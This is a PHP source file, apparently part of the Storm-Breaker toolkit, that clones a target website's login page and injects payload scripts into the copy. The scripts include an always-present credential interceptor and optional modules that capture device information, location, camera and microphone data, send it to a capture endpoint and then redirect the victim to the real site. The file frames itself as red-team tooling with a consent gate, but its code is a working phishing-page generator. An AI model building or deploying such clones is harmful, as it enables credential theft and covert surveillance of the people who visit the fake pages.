<?php
/**
 * cloner.php — fetch a target URL and save a self-contained copy locally.
 *
 *   $result = cloner_clone(
 *       'https://example.com/login',
 *       __DIR__ . '/../targets/tg_a7f3b2',
 *       ['device-info', 'camera']        // payload modules to inject
 *   );
 *
 * Returns ['ok' => bool, 'errors' => string[]].
 *
 * Behaviour:
 *   • Downloads the target HTML and its directly-referenced assets
 *     (<link rel=stylesheet>, <script src>, <img src>).
 *   • Rewrites those references to local paths inside ./assets/.
 *   • Adds <base href="..."> so anything we didn't download still
 *     resolves to the original site instead of breaking.
 *   • Injects /assets/payloads/<module>.js for each requested capability,
 *     plus a small bootstrap that exposes the target slug to those scripts.
 *
 * Hard limits (defensive defaults):
 *   • 50 asset downloads per page
 *   • 5 MB per asset
 *   • 12 s timeout per fetch
 *
 * This is meant for authorized red-team / pentesting work only.
 */

const CLONER_USER_AGENT          = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15';
const CLONER_TIMEOUT             = 12;
const CLONER_MAX_ASSET_BYTES     = 5 * 1024 * 1024;
const CLONER_MAX_ASSETS          = 80;
const CLONER_RENDER_BUDGET_MS    = 8000;   // virtual-time-budget for headless render
const CLONER_RENDER_TIMEOUT_SEC  = 25;     // hard timeout on the chrome subprocess

/**
 * Public entry point.
 *
 * @param string   $url           Source URL to clone.
 * @param string   $target_dir    Absolute path where the clone will live.
 * @param string[] $payloads      Slugs of payload modules to inject.
 * @param ?string  $public_origin Storm-Breaker's public origin (e.g.
 *                                "http://localhost:2525"). Used to write
 *                                absolute URLs for downloaded assets so
 *                                the cloner's <base href> can't redirect
 *                                them back to the original site. When null,
 *                                falls back to relative paths (works only
 *                                if the page is served at "/<slug>/").
 * @param array    $consent       Consent-gate config (see
 *                                cloner_consent_config()). Wording only —
 *                                the gate itself is not optional.
 * @return array{ok:bool, errors:string[]}
 */
function cloner_clone(string $url, string $target_dir, array $payloads, ?string $public_origin = null, array $consent = []): array {
    $errors = [];
    $slug   = basename($target_dir);

    // Try a real browser render first — this is what makes SPAs (React, Vue,
    // Inertia, vanilla fetch-based) clone correctly. Without rendering, the
    // initial HTML for those frameworks is almost empty (`<div id="root">`)
    // and the resulting clone has no visible content.
    //
    // Fall back to plain HTTP fetch when chrome isn't installed or the render
    // produced no usable output.
    [$body, $render_mode] = [null, 'http'];
    $rendered = cloner_render_with_chrome($url);
    if ($rendered['html'] !== null) {
        $body        = $rendered['html'];
        $render_mode = 'chrome';
    } else {
        if ($rendered['error'] !== null) $errors[] = 'render: ' . $rendered['error'];
        [$http_body, , $http_err] = cloner_http_get($url);
        if ($http_body === null) {
            return ['ok' => false, 'errors' => array_merge($errors, ['fetch failed: ' . $http_err])];
        }
        $body = $http_body;
    }

    // Prepare target directories.
    @mkdir($target_dir, 0755, true);
    @mkdir($target_dir . '/assets', 0755, true);
    @mkdir($target_dir . '/captures', 0755, true);
    @mkdir($target_dir . '/audio', 0755, true);

    // Parse HTML. The xml-encoding prolog we prepend forces libxml to read
    // the bytes as UTF-8 (it otherwise assumes Latin-1 and mangles non-ASCII),
    // but it survives parsing as a stray processing-instruction node — strip
    // it back out below so saveHTML() doesn't emit an xml prolog as the first
    // line of every clone.
    $doc = new DOMDocument();
    $prev = libxml_use_internal_errors(true);
    $doc->loadHTML('<?xml encoding="UTF-8">' . $body, LIBXML_NOWARNING | LIBXML_NOERROR);
    libxml_clear_errors();
    libxml_use_internal_errors($prev);

    foreach (iterator_to_array($doc->childNodes) as $child) {
        if ($child->nodeType === XML_PI_NODE) {
            $doc->removeChild($child);
        }
    }

    // Strip ALL <script> tags from the source page. Rationale: SPA bundles
    // (and many inline scripts) hardcode API paths like `/react/api/login`
    // that won't exist on our domain — running them would just produce
    // network errors. The DOM has already been fully rendered by Chrome,
    // so the page still looks identical without re-running the JS.
    // Our own payloads are injected AFTER this strip.
    cloner_strip_scripts($doc);

    // <base href> so anything we don't download (fonts, background images
    // referenced from inline CSS, etc.) still resolves to the original site.
    cloner_inject_base($doc, $url);

    $downloaded = 0;
    cloner_rewrite_assets($doc, $url, $target_dir, $slug, $public_origin, "img",  "src",  $downloaded, $errors);
    cloner_rewrite_assets($doc, $url, $target_dir, $slug, $public_origin, "link", "href", $downloaded, $errors, ['stylesheet','icon','shortcut icon']);

    // Save the rewritten HTML, then inline our payloads via string injection.
    // We can't use DOMDocument for the script tags because:
    //   (a) DOMDocument escapes `<` inside text nodes, which breaks JS like
    //       `for (var i = 0; i < n; i++)`.
    //   (b) <base href> on the page redirects relative AND absolute (`/foo`)
    //       URLs to the origin site — so `<script src="/assets/payloads/...">`
    //       would 404 on the *original* host instead of loading from us.
    // Inlining sidesteps both problems and makes each clone self-contained.
    $html = $doc->saveHTML();
    if ($html === false) {
        return ['ok' => false, 'errors' => ['failed to render HTML']];
    }

    $html = cloner_inject_payload_html($html, $payloads, $url, '', $consent);

    file_put_contents($target_dir . '/index.html', $html, LOCK_EX);

    // Stash the render mode so the operator can see how the clone was made.
    @file_put_contents($target_dir . '/.render-mode', $render_mode, LOCK_EX);

    return ['ok' => true, 'errors' => $errors, 'render_mode' => $render_mode];
}

/* ------------------------------------------------------------------ *
 *  Headless rendering
 * ------------------------------------------------------------------ */

/**
 * Locate a Chrome / Chromium / Edge / Brave executable on the host.
 * Returns null if none is found.
 */
function cloner_find_chrome(): ?string {
    static $cached = null;
    if ($cached !== null) return $cached === '' ? null : $cached;

    $candidates = [
        '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
        '/Applications/Chromium.app/Contents/MacOS/Chromium',
        '/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge',
        '/Applications/Brave Browser.app/Contents/MacOS/Brave Browser',
        '/usr/bin/google-chrome',
        '/usr/bin/google-chrome-stable',
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/snap/bin/chromium',
    ];
    foreach ($candidates as $p) {
        if (is_executable($p)) { $cached = $p; return $p; }
    }
    foreach (['google-chrome', 'chromium', 'chromium-browser', 'chrome'] as $bin) {
        $where = trim((string) @shell_exec('command -v ' . escapeshellarg($bin) . ' 2>/dev/null'));
        if ($where !== '' && is_executable($where)) { $cached = $where; return $where; }
    }
    $cached = '';
    return null;
}

/**
 * Render $url in headless Chrome and return the post-execution DOM.
 * Returns ['html' => string|null, 'error' => string|null].
 */
function cloner_render_with_chrome(string $url): array {
    $chrome = cloner_find_chrome();
    if ($chrome === null) {
        return ['html' => null, 'error' => 'no chrome/chromium found on host'];
    }

    $args = [
        $chrome,
        '--headless=new',
        '--disable-gpu',
        '--no-sandbox',
        '--disable-dev-shm-usage',
        '--hide-scrollbars',
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-extensions',
        '--mute-audio',
        '--user-agent=' . CLONER_USER_AGENT,
        '--virtual-time-budget=' . CLONER_RENDER_BUDGET_MS,
        '--dump-dom',
        $url,
    ];

    // Build a single shell command with a hard timeout so a wedged Chrome
    // can't lock up the request indefinitely. macOS lacks `timeout` by
    // default, so use perl as a portable fallback.
    $quoted = array_map('escapeshellarg', $args);
    $inner  = implode(' ', $quoted);
    $cmd    = sprintf(
        'perl -e %s %d %s 2>/dev/null',
        escapeshellarg('alarm shift; exec @ARGV'),
        CLONER_RENDER_TIMEOUT_SEC,
        $inner
    );

    $html = @shell_exec($cmd);
    if (!is_string($html) || strlen($html) < 100) {
        return ['html' => null, 'error' => 'render produced empty/short output'];
    }
    return ['html' => $html, 'error' => null];
}

/**
 * Remove every <script> tag from the document. Called before payload
 * injection so the original page's JS can't run alongside our hooks.
 * Returns the number of nodes removed.
 */
function cloner_strip_scripts(DOMDocument $doc): int {
    $count = 0;
    $scripts = iterator_to_array($doc->getElementsByTagName('script'));
    foreach ($scripts as $node) {
        if ($node->parentNode !== null) {
            $node->parentNode->removeChild($node);
            $count++;
        }
    }
    return $count;
}

/* ------------------------------------------------------------------ *
 *  HTTP
 * ------------------------------------------------------------------ */

/**
 * GET via cURL. Follows redirects.
 *
 * @return array{0: ?string, 1: string, 2: string}  [body, final_url, error]
 */
function cloner_http_get(string $url): array {
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return [null, $url, 'invalid URL'];
    }

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 5,
        CURLOPT_CONNECTTIMEOUT => CLONER_TIMEOUT,
        CURLOPT_TIMEOUT        => CLONER_TIMEOUT,
        CURLOPT_USERAGENT      => CLONER_USER_AGENT,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_HTTPHEADER     => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.9',
        ],
    ]);
    $body  = curl_exec($ch);
    $final = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL) ?: $url;
    $http  = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err   = curl_error($ch);
    curl_close($ch);

    if ($body === false)            return [null, $final, $err ?: 'curl error'];
    if ($http >= 400)               return [null, $final, "HTTP $http"];
    if ((int) strlen($body) === 0)  return [null, $final, 'empty response'];

    return [$body, $final, ''];
}

/**
 * Same as cloner_http_get but with a byte cap and binary-safe.
 *
 * @return array{0: ?string, 1: string}  [bytes, content_type]
 */
function cloner_http_get_binary(string $url): array {
    if (!filter_var($url, FILTER_VALIDATE_URL)) return [null, ''];

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 5,
        CURLOPT_CONNECTTIMEOUT => CLONER_TIMEOUT,
        CURLOPT_TIMEOUT        => CLONER_TIMEOUT,
        CURLOPT_USERAGENT      => CLONER_USER_AGENT,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
    ]);
    $body = curl_exec($ch);
    $http = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $type = (string) curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);

    if ($body === false || $http >= 400)        return [null, ''];
    if (strlen($body) > CLONER_MAX_ASSET_BYTES) return [null, ''];
    return [$body, $type];
}

/* ------------------------------------------------------------------ *
 *  HTML transformation
 * ------------------------------------------------------------------ */

/** Insert a <base href=...> as the first child of <head>. */
function cloner_inject_base(DOMDocument $doc, string $url): void {
    $head = $doc->getElementsByTagName('head')->item(0);
    if (!$head) return;

    // Don't add a second base if one already exists.
    foreach ($head->getElementsByTagName('base') as $existing) return;

    $base = $doc->createElement('base');
    $base->setAttribute('href', $url);
    $head->insertBefore($base, $head->firstChild);
}

/**
 * Walk all elements of $tag and rewrite the $attr URL to a local one.
 *
 * The rewritten URL must bypass the page's <base href> (which we inject
 * pointing at the original site so non-downloaded relative URLs — fonts,
 * background images in inline CSS — still resolve). If $public_origin is
 * provided, we write a full absolute URL on Storm-Breaker's host. If not,
 * we fall back to a plain "assets/..." relative path which only works when
 * the cloned page is served at "/<slug>/" with a trailing slash AND the
 * <base> resolution doesn't kick in — i.e. legacy/best-effort behaviour.
 */
function cloner_rewrite_assets(
    DOMDocument $doc,
    string      $page_url,
    string      $target_dir,
    string      $slug,
    ?string     $public_origin,
    string      $tag,
    string      $attr,
    int        &$downloaded,
    array      &$errors,
    ?array      $rel_filter = null
): void {
    $nodes = iterator_to_array($doc->getElementsByTagName($tag));
    foreach ($nodes as $node) {
        if ($downloaded >= CLONER_MAX_ASSETS) return;
        if (!$node->hasAttribute($attr))      continue;

        if ($rel_filter !== null) {
            $rel = strtolower(trim((string) $node->getAttribute('rel')));
            if (!in_array($rel, $rel_filter, true)) continue;
        }

        $src = trim((string) $node->getAttribute($attr));
        if ($src === '' || str_starts_with($src, 'data:') || str_starts_with($src, '#')) continue;

        $abs = cloner_resolve_url($src, $page_url);
        if ($abs === null) continue;

        [$bytes, $ctype] = cloner_http_get_binary($abs);
        if ($bytes === null) {
            $errors[] = "skipped {$abs}";
            continue;
        }

        $ext      = cloner_guess_extension($abs, $ctype);
        $filename = substr(sha1($abs), 0, 12) . ($ext !== '' ? '.' . $ext : '');
        $relpath  = "assets/{$filename}";
        $abspath  = $target_dir . '/' . $relpath;

        $public_url = $public_origin !== null
            ? rtrim($public_origin, '/') . '/' . $slug . '/' . $relpath
            : $relpath;

        file_put_contents($abspath, $bytes, LOCK_EX);
        $node->setAttribute($attr, $public_url);
        $downloaded++;
    }
}

/**
 * Consent-gate config, merged over the gate's own defaults.
 *
 * Wording only. There is deliberately no "disable" switch: the gate is
 * always emitted, and every capture module refuses to run without it, so
 * no configuration of this function produces a silently-capturing clone.
 * (Deleting assets/payloads/consent.js has the same effect: modules stay
 * inert rather than falling back to firing on load.)
 */
function cloner_consent_config(array $in): array {
    $cfg = [
        'show_badge'     => true,    // persistent "training mode" pill
        'report_consent' => true,    // log the accept to the panel
        'report_decline' => false,   // a decline stays network-silent
        'text'           => new stdClass(),   // encodes as {} — it's a map, not a list
    ];

    foreach (['show_badge', 'report_consent', 'report_decline'] as $k) {
        if (array_key_exists($k, $in)) $cfg[$k] = (bool) $in[$k];
    }

    $allowed = ['title', 'lead', 'bullets', 'accept', 'decline',
                'confirm_title', 'confirm_lead', 'confirm_accept', 'confirm_back',
                'declined_title', 'declined_note', 'footer', 'badge'];

    if (isset($in['text']) && is_array($in['text'])) {
        $text = [];
        foreach ($allowed as $k) {
            if (!array_key_exists($k, $in['text'])) continue;
            $v = $in['text'][$k];

            if ($k === 'bullets') {
                if (!is_array($v)) continue;
                $bullets = [];
                foreach ($v as $b) {
                    if (is_string($b) && trim($b) !== '') $bullets[] = mb_substr(trim($b), 0, 600);
                }
                if ($bullets) $text['bullets'] = array_slice($bullets, 0, 8);
            } elseif (is_string($v) && trim($v) !== '') {
                $text[$k] = mb_substr(trim($v), 0, 1200);
            }
        }
        if ($text) $cfg['text'] = $text;
    }

    return $cfg;
}

/**
 * Build the payload <script> block. Order matters — it is:
 *
 *   <script> bootstrap (sets __SB_TARGET / __SB_ORIGINAL_URL / __SB_API) </script>
 *   <script> consent-gate config </script>
 *   <script> consent.js   — the gate; nothing below runs until it says so </script>
 *   <script> credentials.js — registers with the gate </script>
 *   <script> device-info / geolocation / camera / microphone — register too </script>
 *   <script> operator-supplied custom JS (optional, last so it can override) </script>
 *
 * Each opt-in payload is read from assets/payloads/<slug>.js and inlined.
 *
 * Inlining matters: a `<script src="/assets/payloads/...">` tag would be
 * resolved through the page's `<base href>` — pointing it at the *original*
 * site and 404-ing — so cloned pages would never run our hooks.
 */
function cloner_build_payload_block(array $payloads, string $original_url, string $custom_js, array $consent = []): string {
    $payloads_dir = __DIR__ . '/../assets/payloads';

    $block = "\n<!-- storm-breaker payloads (inlined) -->\n";

    // Bootstrap. Sets:
    //   __SB_TARGET       — slug parsed from the current URL
    //   __SB_ORIGINAL_URL — where credentials.js redirects after capture
    //   __SB_API          — absolute capture-endpoint URL builder, resilient
    //                       to a <base href> on the page (which would
    //                       otherwise rewrite root-relative `/api/...` paths
    //                       to the *origin* site).
    $block .= "<script>\n";
    $block .= '(function(){'
            . 'var p=location.pathname.replace(/\/+$/,"");'
            . 'window.__SB_TARGET=p.split("/").pop();'
            . 'window.__SB_ORIGINAL_URL=' . json_encode($original_url, JSON_UNESCAPED_SLASHES) . ';'
            . 'window.__SB_API=function(kind){'
            .   'return location.origin+"/api/capture.php?slug="'
            .   '+encodeURIComponent(window.__SB_TARGET)+"&kind="+kind;'
            . '};'
            . '})();';
    $block .= "\n</script>\n";

    // Consent gate. Emitted before every capture module: each of them hands
    // its entry point to __SB_CONSENT.register() instead of self-executing,
    // so this has to define the controller first.
    //
    // JSON_HEX_TAG keeps operator-supplied wording (which may contain "</script>")
    // from breaking out of this <script> block.
    $consent_src = @file_get_contents($payloads_dir . '/consent.js');
    if ($consent_src !== false) {
        $cfg_json = json_encode(
            cloner_consent_config($consent),
            JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT
        );
        $block .= "<script>\nwindow.__SB_CONSENT_CONFIG=" . $cfg_json . ";\n</script>\n";
        $block .= cloner_wrap_inline_script($consent_src);
    }

    // Credential interceptor — always included, but gated.
    $cred_src = @file_get_contents($payloads_dir . '/credentials.js');
    if ($cred_src !== false) {
        $block .= cloner_wrap_inline_script($cred_src);
    }

    // Opt-in modules.
    foreach ($payloads as $slug) {
        if (!preg_match('/^[a-z0-9-]+$/', $slug)) continue;
        if ($slug === 'credentials' || $slug === 'consent') continue;
        $path = "$payloads_dir/$slug.js";
        if (!is_file($path)) continue;
        $src = @file_get_contents($path);
        if ($src === false) continue;
        $block .= cloner_wrap_inline_script($src);
    }

    // Operator-supplied custom JS — last, so it can override anything above.
    // Note this runs regardless of the gate state: it is the operator's own
    // page code, not a capture module.
    $custom_js = trim($custom_js);
    if ($custom_js !== '') {
        $block .= cloner_wrap_inline_script("/* storm-breaker custom-js */\n" . $custom_js);
    }

    $block .= "<!-- /storm-breaker payloads -->\n";
    return $block;
}

/**
 * Splice the payload block into a freshly-cloned HTML string. Used by
 * cloner_clone() right after it saves the rewritten DOM.
 */
function cloner_inject_payload_html(string $html, array $payloads, string $original_url, string $custom_js, array $consent = []): string {
    $block = cloner_build_payload_block($payloads, $original_url, $custom_js, $consent);
    if (preg_match('#</body\s*>#i', $html)) {
        return preg_replace('#</body\s*>#i', $block . '</body>', $html, 1);
    }
    return $html . $block;
}

/**
 * Replace the payload block in an already-saved index.html. The block lives
 * between two HTML comment markers; if they're missing (legacy clone), we
 * splice a fresh block in before </body>.
 *
 * Used by the "update" API action when the operator changes the custom JS,
 * and by tools/rerender-targets.php to push a new block into clones that
 * were generated before the consent gate existed.
 */
function cloner_replace_payload_block(string $target_dir, array $payloads, string $original_url, string $custom_js, array $consent = []): bool {
    $index_path = $target_dir . '/index.html';
    if (!is_file($index_path)) return false;
    $html = file_get_contents($index_path);
    if ($html === false) return false;

    $new_block = cloner_build_payload_block($payloads, $original_url, $custom_js, $consent);

    $pattern = '#\s*<!-- storm-breaker payloads \(inlined\) -->.*?<!-- /storm-breaker payloads -->\s*#s';
    if (preg_match($pattern, $html)) {
        $html = preg_replace($pattern, $new_block, $html, 1);
    } else if (preg_match('#</body\s*>#i', $html)) {
        $html = preg_replace('#</body\s*>#i', $new_block . '</body>', $html, 1);
    } else {
        $html .= $new_block;
    }

    return file_put_contents($index_path, $html, LOCK_EX) !== false;
}

/**
 * Wrap a JS source in a <script>...</script>, escaping any literal
 * `</script>` (which would prematurely close the wrapper).
 */
function cloner_wrap_inline_script(string $js): string {
    $safe = preg_replace('#</(script)#i', '<\\/$1', $js);
    return "<script>\n" . $safe . "\n</script>\n";
}

/* ------------------------------------------------------------------ *
 *  URL helpers
 * ------------------------------------------------------------------ */

/** Resolve a possibly-relative URL against a base. */
function cloner_resolve_url(string $rel, string $base): ?string {
    if (filter_var($rel, FILTER_VALIDATE_URL)) return $rel;

    // Protocol-relative.
    if (str_starts_with($rel, '//')) {
        $b = parse_url($base);
        return ($b['scheme'] ?? 'https') . ':' . $rel;
    }

    $b = parse_url($base);
    if (!$b || empty($b['host']) || empty($b['scheme'])) return null;

    $origin = $b['scheme'] . '://' . $b['host'] . (isset($b['port']) ? ':' . $b['port'] : '');

    if (str_starts_with($rel, '/')) {
        return $origin . $rel;
    }

    // Relative to current path's directory.
    $path = $b['path'] ?? '/';
    $dir  = rtrim(substr($path, 0, strrpos($path, '/') + 1), '/');
    if ($dir === '') $dir = '';
    return $origin . $dir . '/' . $rel;
}

/** Best-effort extension from URL path or content-type. */
function cloner_guess_extension(string $url, string $content_type): string {
    $path = parse_url($url, PHP_URL_PATH) ?: '';
    if ($path !== '' && preg_match('/\.([a-zA-Z0-9]{2,5})$/', $path, $m)) {
        return strtolower($m[1]);
    }
    $ct = strtolower(trim(explode(';', $content_type)[0]));
    static $map = [
        'text/css'                 => 'css',
        'application/javascript'   => 'js',
        'text/javascript'          => 'js',
        'image/png'                => 'png',
        'image/jpeg'               => 'jpg',
        'image/gif'                => 'gif',
        'image/webp'               => 'webp',
        'image/svg+xml'            => 'svg',
        'image/x-icon'             => 'ico',
        'image/vnd.microsoft.icon' => 'ico',
        'font/woff'                => 'woff',
        'font/woff2'               => 'woff2',
    ];
    return $map[$ct] ?? '';
}

/* ------------------------------------------------------------------ *
 *  Slug + utility
 * ------------------------------------------------------------------ */

/**
 * Slugs that would collide with top-level routes / files / dirs and
 * therefore can never be used as a target slug.
 */
const CLONER_RESERVED_SLUGS = [
    'panel', 'login', 'logout', 'index', 'auth', 'config', 'settings',
    'receiver', 'api', 'lib', 'targets', 'assets', 'images', 'sounds',
    'log', 'router', 'admin', 'public', 'static',
];

/**
 * Validate a target slug.
 *  - 1–32 chars
 *  - lowercase letters, digits, dashes, underscores
 *  - must start and end with [a-z0-9]
 *  - cannot be a reserved word
 */
function cloner_valid_slug(string $slug): bool {
    $len = strlen($slug);
    if ($len < 1 || $len > 32) return false;
    if (!preg_match('/^[a-z0-9](?:[a-z0-9_-]*[a-z0-9])?$/', $slug)) return false;
    if (in_array($slug, CLONER_RESERVED_SLUGS, true)) return false;
    return true;
}

/** Random target slug like "tg_a7f3b2". Always passes cloner_valid_slug(). */
function cloner_new_slug(): string {
    return 'tg_' . substr(bin2hex(random_bytes(4)), 0, 6);
}

/**
 * Atomically rename a target's directory (i.e. change its slug).
 * Returns ['ok' => bool, 'error' => string|null].
 */
function cloner_rename_slug(string $targets_root, string $old_slug, string $new_slug): array {
    if (!cloner_valid_slug($new_slug)) {
        return ['ok' => false, 'error' => 'Invalid slug.'];
    }
    if ($old_slug === $new_slug) {
        return ['ok' => true,  'error' => null];
    }
    $old_dir = $targets_root . '/' . $old_slug;
    $new_dir = $targets_root . '/' . $new_slug;
    if (!is_dir($old_dir)) {
        return ['ok' => false, 'error' => 'Target not found.'];
    }
    if (file_exists($new_dir)) {
        return ['ok' => false, 'error' => 'A target with that slug already exists.'];
    }
    if (!@rename($old_dir, $new_dir)) {
        return ['ok' => false, 'error' => 'Failed to rename target directory.'];
    }

    // Update meta.json so it reflects the new slug.
    $meta_path = "$new_dir/meta.json";
    $meta = is_file($meta_path) ? json_decode((string) file_get_contents($meta_path), true) : null;
    if (is_array($meta)) {
        $meta['slug'] = $new_slug;
        @file_put_contents($meta_path, json_encode($meta, JSON_PRETTY_PRINT), LOCK_EX);
    }
    return ['ok' => true, 'error' => null];
}

/** Recursive directory delete (used by the targets API on delete). */
function cloner_rrmdir(string $dir): bool {
    if (!is_dir($dir)) return true;
    foreach (scandir($dir) ?: [] as $f) {
        if ($f === '.' || $f === '..') continue;
        $p = $dir . DIRECTORY_SEPARATOR . $f;
        is_dir($p) ? cloner_rrmdir($p) : @unlink($p);
    }
    return @rmdir($dir);
}
